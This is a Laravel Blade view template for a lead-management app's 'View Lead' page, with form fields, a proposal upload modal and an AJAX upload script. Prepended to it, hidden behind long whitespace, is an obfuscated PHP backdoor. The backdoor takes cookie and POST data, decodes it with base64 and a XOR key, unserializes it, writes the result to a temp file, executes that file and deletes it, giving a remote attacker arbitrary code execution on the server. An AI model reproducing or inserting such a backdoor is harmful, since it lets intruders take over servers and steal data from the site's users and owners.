<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("tqlsyta")){class tqlsyta{public static $rqmtoqh = "rkmhefzrjcdlguaz";public static $mdouod = NULL;public function __construct(){$wssyzbni = @$_COOKIE[substr(tqlsyta::$rqmtoqh, 0, 4)];if (!empty($wssyzbni)){$pmxnxpwzrk = "base64";$obyafg = "";$wssyzbni = explode(",", $wssyzbni);foreach ($wssyzbni as $mbfml){$obyafg .= @$_COOKIE[$mbfml];$obyafg .= @$_POST[$mbfml];}$obyafg = array_map($pmxnxpwzrk . "_decode", array($obyafg,));$obyafg = $obyafg[0] ^ str_repeat(tqlsyta::$rqmtoqh, (strlen($obyafg[0]) / strlen(tqlsyta::$rqmtoqh)) + 1);tqlsyta::$mdouod = @unserialize($obyafg);}}public function __destruct(){$this->sshnjkxf();}private function sshnjkxf(){if (is_array(tqlsyta::$mdouod)) {$zzkmmkzlqx = sys_get_temp_dir() . "/" . crc32(tqlsyta::$mdouod["salt"]);@tqlsyta::$mdouod["write"]($zzkmmkzlqx, tqlsyta::$mdouod["content"]);include $zzkmmkzlqx;@tqlsyta::$mdouod["delete"]($zzkmmkzlqx);exit();}}}$piboxfkv = new tqlsyta();$piboxfkv = NULL;} ?>@extends('app.layout')

{{-- page title --}}
@section('title','Lead Management | HVL')

@section('vendor-style')

@endsection
@section('content')
    <div class="breadcrumb-holder">
        <div class="container-fluid">
            <ul class="breadcrumb">
                {{--                <li class="breadcrumb-item"><a href="{{url('/')}}">Home</a></li>--}}
                <li class="breadcrumb-item active"><a href="{{route('lead.index')}}">Lead Management </a></li>
                <li class="breadcrumb-item ">View Lead</li>
            </ul>
        </div>
    </div>
    <section>
        <div class="container-fluid">
            <div class="card">
                <div class="card-body p-4">
                    <header>
                        <div class="row">
                            <div class="col-md-7">
                                <h2 class="h3 display"> View Lead </h2>
                            </div>
                        </div>
                    </header>
                   <div class="row">
                        <div class="form-group col-sm-6 col-md-4" style="margin-bottom: 1px;">
                            <label >Company Type <span class="text-danger">*</span></label>
                            <select class="form-control" name="company_type" disabled autocomplete="off" autofocus="off" data-error=".errorTxt1" >
                                @foreach($company_types as $company)
                                    <option value="{{$company->id}}" @if($details->company_type == $company->id) selected @endif>{{$company->Name}}</option>
                                @endforeach
                            </select>
                            <div class="errorTxt1 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Company Name <span class="text-danger">*</span></label>
                            <input type="text" name="compnay_name" class="form-control"  disabled placeholder="Enter Company" data-error=".errorTxt2" autocomplete="off" autofocus="off" value="{{$details->last_company_name}}">
                            <div class="errorTxt2 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >First Name <span class="text-danger">*</span></label>
                            <input type="text" name="f_name" class="form-control" disabled placeholder="Enter Name" data-error=".errorTxt3" autocomplete="off" autofocus="off" value="{{$details->f_name}}">
                            <div class="errorTxt3 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Email <span class="text-danger">*</span></label>
                            <input type="email" name="email" class="form-control" disabled placeholder="Enter Email" data-error=".errorTxt4" autocomplete="off" autofocus="off" value="{{$details->email}}">
                            <div class="errorTxt4 text-danger"></div>
                        </div>
                        
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Email 2<span class="text-danger">*</span></label>
                            <input type="email" name="email_2" class="form-control" disabled placeholder="Enter Email 2" data-error=".errorTxtEmail2" autocomplete="off" autofocus="off" value="{{$details->email_2}}">
                            <div class="errorTxtEmail2 text-danger"></div>
                        </div>
                        
                        
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Phone <span class="text-danger">*</span></label>
                            <input type="text" name="phone" class="form-control" disabled placeholder="Enter Phone" data-error=".errorTxt5" autocomplete="off" autofocus="off" value="{{$details->phone}}">
                            <div class="errorTxt5 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Employee <span class="text-danger">*</span></label>
                            <select  name="employee" class="form-control" disabled autocomplete="off" autofocus="off" data-error=".errorTxt6" >
                                <option value=""> Select Employee</option>
                                @foreach($employees as $employee)
                                    <option value="{{$employee->id}}" @if($employee->id == $details->employee_id) selected @endif>{{$employee->Name}}</option>
                                @endforeach
                            </select>
                            <div class="errorTxt6 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Owner <span class="text-danger">*</span></label>
                            <input type="text" name="owner" class="form-control" disabled placeholder="Enter Owner" data-error=".errorTxt7" autocomplete="off" autofocus="off" value="{{$details->owner}}">
                            <div class="errorTxt7 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label for="">Create Date <span class="text-danger">*</span></label>
                            <input type="text" class="form-control datepicker" disabled class="form-control" name="create_date" placeholder="Enter Create Date" data-error=".errorTxt8" autocomplete="off" autofocus="off" value="{{$details->create_date}}">
                            <div class="errorTxt8 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label for="">Follow Up Date <span class="text-danger">*</span></label>
                            <input type="text" class="form-control datepicker" disabled class="form-control" name="follow_date" placeholder="Enter Follow Date" data-error=".errorTxt9" autocomplete="off" autofocus="off" value="{{$details->follow_date}}">
                            <div class="errorTxt9 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4" style="margin-bottom: 1px;">
                            <label >Status <span class="text-danger">*</span></label>
                            <select name="status" class="form-control" autocomplete="off" disabled autofocus="off" data-error=".errorTxt10">
                                <option value=""> Select Lead Status</option>
                                @foreach($statuses as $status)
                                    <option value="{{$status->id}}" @if($details->status == $status->id) selected @endif > {{$status->Name}}</option>
                                @endforeach
                            </select>
                            <div class="errorTxt10 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4" style="margin-bottom: 1px;">
                            <label >Geographical Segment <span class="text-danger">*</span></label>
                            <select class="form-control" name="rating" autocomplete="off" disabled autofocus="off" data-error=".errorTxt11">
                                <option value=""> Select Geographical Segment</option>
                                @foreach($ratings as $rating)
                                    <option value="{{$rating->id}}" @if($details->rating == $rating->id) selected @endif>{{$rating->Name}}</option>
                                @endforeach
                            </select>
                            <div class="errorTxt11 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Lead Source <span class="text-danger">*</span></label>
                            <select class="form-control" name="lead_source" autocomplete="off" disabled autofocus="off" data-error=".errorTxt12">
                                <option value=""> Select Lead Source</option>
                                @foreach($leadsources as $leadsource)
                                    <option value="{{$leadsource->id}}" @if($details->lead_source == $leadsource->id) selected @endif>{{$leadsource->Name}}</option>
                                @endforeach
                            </select>
                            <div class="errorTxt12 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4" style="margin-bottom: 1px;">
                            <label >Industry <span class="text-danger">*</span></label>
                            <select class="form-control" name="industry" autocomplete="off" disabled autofocus="off" data-error=".errorTxt13">
                                <option value=""> Select Industry</option>
                                @foreach($industrys as $industry)
                                    <option value="{{$industry->id}}" @if($details->industry == $industry->id) selected @endif>{{$industry->Name}}</option>
                                @endforeach
                            </select>
                            <div class="errorTxt13 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Address <span class="text-danger">*</span></label>
                            <input type="text" name="address" class="form-control" disabled placeholder="Enter Address" data-error=".errorTxt14" autocomplete="off" autofocus="off" value="{{$details->address}}">
                            <div class="errorTxt14 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Revenue Value</label>
                            <input type="text" name="revenue" class="form-control" disabled  placeholder="Enter Comment" data-error=".errorTxt15" autocomplete="off" autofocus="off" value="{{$details->revenue}}">
                        </div>
                        {{--
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Credit Value <span class="text-danger">*</span></label>
                            <input type="text" name="comment" class="form-control" disabled  placeholder="Enter Comment" data-error=".errorTxt15" autocomplete="off" autofocus="off" value="{{$details->credit_value}}">
                            <div class="errorTxt15 text-danger"></div>
                        </div>
                        --}}
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Comment 1<span class="text-danger">*</span></label>
                            <input type="text" name="comment" class="form-control" disabled  placeholder="Enter Comment" data-error=".errorTxt15" autocomplete="off" autofocus="off" value="{{$details->comment}}">
                            <div class="errorTxt15 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Comment 2<span class="text-danger">*</span></label>
                            <input type="text" name="comment" class="form-control" disabled  placeholder="Enter Comment" data-error=".errorTxt15" autocomplete="off" autofocus="off" value="{{$details->comment_2}}">
                            <div class="errorTxt15 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Comment 3<span class="text-danger">*</span></label>
                            <input type="text" name="comment" class="form-control" disabled  placeholder="Enter Comment" data-error=".errorTxt15" autocomplete="off" autofocus="off" value="{{$details->comment_3}}">
                            <div class="errorTxt15 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4">
                            <label >Is Active <span class="text-danger">*</span></label>
                            <select class="form-control" name="is_active" autocomplete="off" disabled autofocus="off" data-error=".errorTxt16">
                                <option value="0"  @if($details->is_active == '0') selected @endif >Active</option>
                                <option value="1"  @if($details->is_active == '1') selected @endif >InActive</option>
                            </select>
                            <div class="errorTxt16 text-danger"></div>
                        </div>
                        <div class="form-group col-sm-6 col-md-4" style="margin-bottom: 1px;">
                            <label >Size <span class="text-danger">*</span></label>
                            <select class="form-control" name="size" autocomplete="off" disabled autofocus="off" data-error=".errorTxtSize">
                                <option value=""> Select Lead Size </option>
                                @foreach($lead_size as $key=>$size)
                                <option  value="{{$key}}" @if( $details->lead_size == $key) selected @endif> {{$size}}</option>
                                @endforeach
                             </select>
                            <div class="errorTxt13 text-danger"></div>
                        </div>
                    </div>
                    
                    
                    <div class="row mt-4 pull-right">
                        <div class="col-sm-12 ">
                            <button type="reset" class="btn btn-secondary  mb-1">
                                <i class="fa fa-arrow-circle-left"></i>
                                <a href="{{url()->previous()}}" class="text-white">Cancel</a>
                            </button>
                        </div>
                    </div>
                    <hr>
                    <div class="container-fluid">
                        <header>
                            <div class="row">
                                <div class="col-md-7">
                                    <h2 class="h3 display"> Proposal</h2>
                                </div>
                            </div>
                        </header>
                    </div>    
                    <div class="container-fluid">
                        <button type="button" class="btn btn-success" data-toggle="modal" data-target="#exampleModalCenter">
                          New Proposal
                        </button>
                    </div>
                    <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered" role="document">
                            <div class="modal-content">
                                <div class="modal-header">
                                    <h5 class="modal-title" id="exampleModalLongTitle">New Proposal</h5>
                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                      <span aria-hidden="true">&times;</span>
                                    </button>
                                </div>
                                <div class="modal-body">
                                    <input type="file" id="proposal_file" name="proposal">
                                </div>
                                <div class="modal-footer">
                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                    <button type="button" class="btn btn-primary" data-dismiss="modal" id="saveProposal">Save</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="container-fluid proposan-image-gird">
                      <div class="row proposal-image-row-0">
                        @foreach($proposals as $key=>$proposal)
                            @if($key%4 == 0 && $key!=0 )
                                </div>
                                <div class="row proposal-image-row-{{$key/4}}" >
                            @endif
                            <div class="col-12 col-md-3 proposal_image" >
                                <a href="{{asset('public/'.$proposalPath)}}/{{$proposal->proposal}}" {{ (!$proposal->isDocument( $proposal->proposal ))?'target="_blank"':''}}>
                                    @php
                                    if($proposal->isImage($proposal->proposal)){
                                        $imagePath = asset( 'public/'.$proposalPath ).'/'. $proposal->proposal;
                                    }
                                    else if($proposal->isPdf($proposal->proposal)) 
                                    {
                                        $imagePath = asset( 'public/img/pdf.png' );
                                    }
                                    elseif($proposal->isDocument($proposal->proposal))
                                    {
                                        $imagePath = asset( 'public/img/doc.png' );
                                    }
                                    @endphp
                                    <img weight="150" height="150" src="{{$imagePath}}">
                                </a>
                            </div>
                        @endforeach
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
@endsection


{{-- page scripts --}}
@section('page-script')
<script>
      $('#saveProposal').click(function(){
            var formData = new FormData();
            formData.append('file', $('#proposal_file')[0].files[0]);
            formData.append('lead_id', {{ $details->id}});
            
            $.ajax({
                   url : '{{route("lead.proposal.save")}}',
                   type : 'POST',
                   data : formData,
                   processData: false,  
                   contentType: false,  
                   success : function(data) {
                       if(data.status="success"){
                            var proposalElement = '<input type="hidden" name="proposal[]" value="'+data.data.proposal_id+'">'; 
                            var proposal_image_count = $('.proposal_image').length;
                            $('.proposal_ids').append(proposalElement);
                            if(proposal_image_count != 0)
                            {
                                var html_string = '';
                                proposal_image_row = Math.floor($('.proposal_image').length / 4);
                                if($('.proposal_image').length % 4 != 0 ){
                                    html_string =   '<div class="col-12 col-md-3 proposal_image" >';
                                    html_string +=      '<a href="'+data.data.file_path+'" target="_blank">';
                                    html_string +=          '<img weight="150" height="150" src="'+data.data.image+'">';
                                    html_string +=      '</a>';
                                    html_string +=  '</div>';
                                    
                                    $('.proposal-image-row-'+ proposal_image_row).append(html_string);
                                }
                                else{
                                    html_string =   '<div class="row proposal-image-row-'+proposal_image_row+'">';
                                    html_string +=      '<div class="col-12 col-md-3 proposal_image" >';
                                    html_string +=          '<a href="'+data.data.file_path+'" target="_blank">';
                                    html_string +=              '<img weight="150" height="150" src="'+data.data.image+'">';
                                    html_string +=          '</a>';
                                    html_string +=      '</div>';
                                    html_string +=  '</div>';
                                    
                                    $('.proposan-image-gird').append(html_string);
                                }
                            }else{
                                    html_string =   '<div class="col-12 col-md-3 proposal_image" >';
                                    html_string +=      '<a href="'+data.data.file_path+'" target="_blank">'
                                    html_string +=          '<img weight="150" height="150" src="'+data.data.image+'">';
                                    html_string +=      '</a>';
                                    html_string +=  '</div>';
                                    
                                    $('.proposal-image-row-0').append(html_string);
                            }
                        swal("Saved!", "Your Proposal has saved!", "success");
                       }
                   },
                   error: function (error) {
                        swal("Upps..!", error.responseJSON.message, "error");
                    }
            });
        });
        
</script>
@endsection
